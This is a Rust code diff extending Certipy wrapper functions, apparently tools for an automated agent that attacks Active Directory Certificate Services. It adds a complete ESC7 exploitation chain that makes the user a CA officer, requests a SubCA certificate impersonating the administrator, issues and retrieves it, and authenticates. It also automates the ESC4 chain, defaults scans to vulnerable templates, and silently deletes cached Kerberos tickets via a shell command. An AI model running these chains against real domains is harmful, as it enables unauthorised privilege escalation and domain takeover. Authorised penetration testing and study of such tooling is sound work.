@@ -15,7 +15,7 @@ pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
     let dc_ip = required_str(args, "dc_ip")?;
-    let vulnerable = optional_bool(args, "vulnerable").unwrap_or(false);
+    let vulnerable = optional_bool(args, "vulnerable").unwrap_or(true);
     let hashes = optional_str(args, "hashes");
 
     let user_at_domain = format!("{username}@{domain}");
@@ -25,6 +25,7 @@ pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
         .flag("-u", &user_at_domain)
         .flag("-dc-ip", dc_ip)
         .arg("-text")
+        .arg("-stdout")
         .arg_if(vulnerable, "-vulnerable")
         .timeout_secs(120);
 
@@ -41,7 +42,8 @@ pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
 /// Request a certificate from an ADCS CA using Certipy.
 ///
 /// Required args: `username`, `domain`, `password`, `ca`, `template`, `dc_ip`
-/// Optional args: `upn`
+/// Optional args: `upn`, `target` (CA server IP/hostname — use when CA is not on the DC),
+///   `sid` (SID to embed in cert), `out` (output PFX filename)
 pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
     let username = required_str(args, "username")?;
     let domain = required_str(args, "domain")?;
@@ -50,6 +52,23 @@ pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
     let template = required_str(args, "template")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let upn = optional_str(args, "upn");
+    let sid = optional_str(args, "sid");
+    let target = optional_str(args, "target")
+        .or_else(|| optional_str(args, "ca_host"))
+        .or_else(|| optional_str(args, "target_ip"));
+
+    // Generate a unique output filename to avoid certipy's interactive overwrite
+    // prompt which kills non-interactive runs. Use template + epoch millis.
+    let out = match optional_str(args, "out") {
+        Some(o) => o.to_string(),
+        None => {
+            let ts = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_millis())
+                .unwrap_or(0);
+            format!("cert_{template}_{ts}")
+        }
+    };
 
     let user_at_domain = format!("{username}@{domain}");
 
@@ -60,7 +79,10 @@ pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
         .flag("-ca", ca)
         .flag("-template", template)
         .flag("-dc-ip", dc_ip)
+        .flag("-out", out)
+        .flag_opt("-target", target)
         .flag_opt("-upn", upn)
+        .flag_opt("-sid", sid)
         .timeout_secs(120)
         .execute()
         .await
@@ -73,6 +95,15 @@ pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
     let pfx_path = required_str(args, "pfx_path")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let domain = required_str(args, "domain")?;
+
+    // Certipy auth writes .ccache based on cert subject (e.g. administrator.ccache)
+    // and does NOT support -out. Remove existing .ccache files to prevent the
+    // interactive "Overwrite? (y/n)" prompt that kills non-interactive runs.
+    let _ = tokio::process::Command::new("sh")
+        .arg("-c")
+        .arg("rm -f *.ccache 2>/dev/null")
+        .output()
+        .await;
 
     CommandBuilder::new("certipy")
         .arg("auth")
@@ -96,6 +127,27 @@ pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
 
     let user_at_domain = format!("{username}@{domain}");
 
+    // Generate unique output name to avoid interactive overwrite prompt
+    let out = match optional_str(args, "out") {
+        Some(o) => o.to_string(),
+        None => {
+            let ts = std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_millis())
+                .unwrap_or(0);
+            format!("shadow_{target}_{ts}")
+        }
+    };
+
+    // certipy shadow auto internally calls certipy auth which writes .ccache
+    // based on the target account name. Remove existing .ccache to prevent the
+    // interactive "Overwrite? (y/n)" prompt.
+    let _ = tokio::process::Command::new("sh")
+        .arg("-c")
+        .arg("rm -f *.ccache 2>/dev/null")
+        .output()
+        .await;
+
     CommandBuilder::new("certipy")
         .arg("shadow")
         .arg("auto")
@@ -103,9 +155,254 @@ pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
         .flag("-password", password)
         .flag("-account", target)
         .flag("-dc-ip", dc_ip)
+        .flag("-out", out)
         .timeout_secs(120)
         .execute()
         .await
+}
+
+/// Certipy CA management operations (add-officer, issue-request).
+///
+/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
+/// Required: one of `add_officer` (bool) or `issue_request` (integer request ID)
+pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
+    let username = required_str(args, "username")?;
+    let domain = required_str(args, "domain")?;
+    let password = required_str(args, "password")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let ca = required_str(args, "ca")?;
+
+    let user_at_domain = format!("{username}@{domain}");
+
+    let add_officer = optional_bool(args, "add_officer").unwrap_or(false);
+    let issue_request = args
+        .get("issue_request")
+        .and_then(|v| v.as_i64())
+        .map(|v| v as i32);
+
+    let mut cmd = CommandBuilder::new("certipy")
+        .arg("ca")
+        .flag("-username", user_at_domain)
+        .flag("-password", password)
+        .flag("-dc-ip", dc_ip)
+        .flag("-ca", ca)
+        .timeout_secs(120);
+
+    if add_officer {
+        cmd = cmd.flag("-add-officer", format!("{username}@{domain}"));
+    }
+    if let Some(req_id) = issue_request {
+        cmd = cmd.flag("-issue-request", req_id.to_string());
+    }
+
+    cmd.execute().await
+}
+
+/// Retrieve a previously issued certificate by request ID.
+///
+/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`,
+///                `request_id`
+/// Optional args: `target` (CA server IP)
+pub async fn certipy_retrieve(args: &Value) -> Result<ToolOutput> {
+    let username = required_str(args, "username")?;
+    let domain = required_str(args, "domain")?;
+    let password = required_str(args, "password")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let ca = required_str(args, "ca")?;
+    let request_id =
+        args.get("request_id")
+            .and_then(|v| v.as_i64())
+            .ok_or_else(|| anyhow::anyhow!("missing required arg: request_id"))? as i32;
+    let target = optional_str(args, "target")
+        .or_else(|| optional_str(args, "ca_host"))
+        .or_else(|| optional_str(args, "target_ip"));
+
+    let user_at_domain = format!("{username}@{domain}");
+
+    let ts = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_millis())
+        .unwrap_or(0);
+    let out = format!("cert_retrieve_{request_id}_{ts}");
+
+    CommandBuilder::new("certipy")
+        .arg("req")
+        .flag("-username", user_at_domain)
+        .flag("-password", password)
+        .flag("-ca", ca)
+        .flag("-retrieve", request_id.to_string())
+        .flag("-dc-ip", dc_ip)
+        .flag("-out", out)
+        .flag_opt("-target", target)
+        .timeout_secs(120)
+        .execute()
+        .await
+}
+
+/// Run the full ESC7 exploitation chain: add officer → request SubCA cert
+/// (gets denied) → issue the pending request → retrieve cert → authenticate.
+///
+/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
+/// Optional args: `target` (CA server IP), `upn`, `sid`
+pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
+    let username = required_str(args, "username")?;
+    let domain = required_str(args, "domain")?;
+    let password = required_str(args, "password")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let ca = required_str(args, "ca")?;
+    let upn = optional_str(args, "upn")
+        .unwrap_or("administrator")
+        .to_string();
+    let target = optional_str(args, "target")
+        .or_else(|| optional_str(args, "ca_host"))
+        .or_else(|| optional_str(args, "target_ip"));
+    let sid = optional_str(args, "sid");
+
+    let upn_full = if upn.contains('@') {
+        upn.clone()
+    } else {
+        format!("{upn}@{domain}")
+    };
+
+    let user_at_domain = format!("{username}@{domain}");
+    let mut outputs = Vec::new();
+
+    // Step 1: Add self as CA officer (certipy v5 requires principal as arg)
+    let step1 = CommandBuilder::new("certipy")
+        .arg("ca")
+        .flag("-username", &user_at_domain)
+        .flag("-password", password)
+        .flag("-dc-ip", dc_ip)
+        .flag("-ca", ca)
+        .flag("-add-officer", &user_at_domain)
+        .timeout_secs(120)
+        .execute()
+        .await?;
+    outputs.push(("Add Officer", step1));
+
+    // Step 2: Request cert with SubCA template (will be denied/pending)
+    let ts = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_millis())
+        .unwrap_or(0);
+    let out_name = format!("cert_esc7_{ts}");
+
+    let mut req_cmd = CommandBuilder::new("certipy")
+        .arg("req")
+        .flag("-username", &user_at_domain)
+        .flag("-password", password)
+        .flag("-ca", ca)
+        .flag("-template", "SubCA")
+        .flag("-upn", &upn_full)
+        .flag("-dc-ip", dc_ip)
+        .flag("-out", &out_name);
+    if let Some(t) = &target {
+        req_cmd = req_cmd.flag("-target", *t);
+    }
+    if let Some(s) = &sid {
+        req_cmd = req_cmd.flag("-sid", *s);
+    }
+    let step2 = req_cmd.timeout_secs(120).execute().await?;
+
+    // Parse the request ID from certipy output (e.g., "Request ID is 42")
+    let request_id = step2
+        .stdout
+        .lines()
+        .chain(step2.stderr.lines())
+        .find_map(|line| {
+            let lower = line.to_lowercase();
+            if lower.contains("request id") {
+                line.split_whitespace()
+                    .filter_map(|w| w.trim_end_matches('.').parse::<i32>().ok())
+                    .next_back()
+            } else {
+                None
+            }
+        });
+    outputs.push(("Request SubCA", step2));
+
+    let req_id = match request_id {
+        Some(id) => id,
+        None => {
+            let combined = outputs
+                .iter()
+                .map(|(name, o)| format!("=== {name} ===\n{}\n{}", o.stdout, o.stderr))
+                .collect::<Vec<_>>()
+                .join("\n");
+            return Ok(ToolOutput {
+                stdout: combined,
+                stderr: "ERROR: Could not parse request ID from certipy output".into(),
+                exit_code: Some(1),
+                success: false,
+            });
+        }
+    };
+
+    // Step 3: Issue the pending request using ManageCA rights
+    let step3 = CommandBuilder::new("certipy")
+        .arg("ca")
+        .flag("-username", &user_at_domain)
+        .flag("-password", password)
+        .flag("-dc-ip", dc_ip)
+        .flag("-ca", ca)
+        .flag("-issue-request", req_id.to_string())
+        .timeout_secs(120)
+        .execute()
+        .await?;
+    outputs.push(("Issue Request", step3));
+
+    // Step 4: Retrieve the issued certificate
+    let step4 = CommandBuilder::new("certipy")
+        .arg("req")
+        .flag("-username", &user_at_domain)
+        .flag("-password", password)
+        .flag("-ca", ca)
+        .flag("-retrieve", req_id.to_string())
+        .flag("-dc-ip", dc_ip)
+        .flag("-out", &out_name);
+    let mut step4 = step4;
+    if let Some(t) = &target {
+        step4 = step4.flag("-target", *t);
+    }
+    let step4_out = step4.timeout_secs(120).execute().await?;
+    outputs.push(("Retrieve Cert", step4_out));
+
+    // Step 5: Authenticate with the retrieved PFX
+    let pfx_path = format!("{out_name}.pfx");
+    let _ = tokio::process::Command::new("sh")
+        .arg("-c")
+        .arg("rm -f *.ccache 2>/dev/null")
+        .output()
+        .await;
+
+    let step5 = CommandBuilder::new("certipy")
+        .arg("auth")
+        .flag("-pfx", &pfx_path)
+        .flag("-dc-ip", dc_ip)
+        .flag("-domain", domain)
+        .timeout_secs(120)
+        .execute()
+        .await?;
+    let auth_success = step5.success;
+    outputs.push(("Authenticate", step5));
+
+    let combined_stdout = outputs
+        .iter()
+        .map(|(name, o)| format!("=== Step: {name} ===\n{}", o.stdout))
+        .collect::<Vec<_>>()
+        .join("\n");
+    let combined_stderr = outputs
+        .iter()
+        .map(|(name, o)| format!("=== Step: {name} ===\n{}", o.stderr))
+        .collect::<Vec<_>>()
+        .join("\n");
+
+    Ok(ToolOutput {
+        stdout: combined_stdout,
+        stderr: combined_stderr,
+        exit_code: if auth_success { Some(0) } else { Some(1) },
+        success: auth_success,
+    })
 }
 
 /// Modify a certificate template for ESC4 exploitation using Certipy.
@@ -136,12 +433,34 @@ pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
 /// request -> authentication.
 ///
 /// Required args: `username`, `domain`, `password`, `template`, `dc_ip`,
-///                `ca`, `pfx_path`
-/// Optional args: `upn`
+///                `ca`
+/// Optional args: `upn`, `target`, `sid`
 pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
     let template_output = certipy_template_esc4(args).await?;
-    let request_output = certipy_request(args).await?;
-    let auth_output = certipy_auth(args).await?;
+
+    // Generate a unique output name for the PFX and inject into args
+    let template = args
+        .get("template")
+        .and_then(|v| v.as_str())
+        .unwrap_or("esc4");
+    let ts = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_millis())
+        .unwrap_or(0);
+    let out_name = format!("cert_{template}_{ts}");
+    let pfx_path = format!("{out_name}.pfx");
+
+    let mut req_args = args.clone();
+    if let Some(obj) = req_args.as_object_mut() {
+        obj.insert("out".into(), serde_json::json!(out_name));
+    }
+    let request_output = certipy_request(&req_args).await?;
+
+    let mut auth_args = args.clone();
+    if let Some(obj) = auth_args.as_object_mut() {
+        obj.insert("pfx_path".into(), serde_json::json!(pfx_path));
+    }
+    let auth_output = certipy_auth(&auth_args).await?;
 
     let combined_stdout = format!(
         "=== Step 1: Template Modification ===\n{}\n\
